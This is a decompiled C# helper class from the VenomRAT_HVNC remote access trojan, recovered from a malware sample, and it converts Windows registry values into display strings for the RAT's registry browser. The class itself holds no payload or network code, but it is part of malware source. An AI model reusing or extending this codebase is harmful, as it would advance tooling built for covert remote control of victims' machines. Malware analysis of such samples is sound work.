// Decompiled with JetBrains decompiler
// Type: VenomRAT_HVNC.Server.Helper.RegValueHelper
// Assembly: VenomRAT_HVNC, Version=5.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 364FC72B-4DB8-403E-BB7F-732199A12380
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Alien.gen-666d190a7059c03b3572dd66e51b8232537a8650bbdcbfbe3f8335c830f3aeae.exe

using Microsoft.Win32;
using System;

namespace VenomRAT_HVNC.Server.Helper
{
  public class RegValueHelper
  {
    private static string DEFAULT_REG_VALUE = "(Default)";

    public static bool IsDefaultValue(string valueName) => string.IsNullOrEmpty(valueName);

    public static string GetName(string valueName) => !RegValueHelper.IsDefaultValue(valueName) ? valueName : RegValueHelper.DEFAULT_REG_VALUE;

    public static string RegistryValueToString(RegistrySeeker.RegValueData value)
    {
      switch (value.Kind)
      {
        case RegistryValueKind.String:
        case RegistryValueKind.ExpandString:
          return ByteConverter.ToString(value.Data);
        case RegistryValueKind.Binary:
          return value.Data.Length == 0 ? "(zero-length binary value)" : BitConverter.ToString(value.Data).Replace("-", " ").ToLower();
        case RegistryValueKind.DWord:
          uint uint32 = ByteConverter.ToUInt32(value.Data);
          return string.Format("0x{0:x8} ({1})", (object) uint32, (object) uint32);
        case RegistryValueKind.MultiString:
          return string.Join(" ", ByteConverter.ToStringArray(value.Data));
        case RegistryValueKind.QWord:
          ulong uint64 = ByteConverter.ToUInt64(value.Data);
          return string.Format("0x{0:x8} ({1})", (object) uint64, (object) uint64);
        default:
          return string.Empty;
      }
    }
  }
}
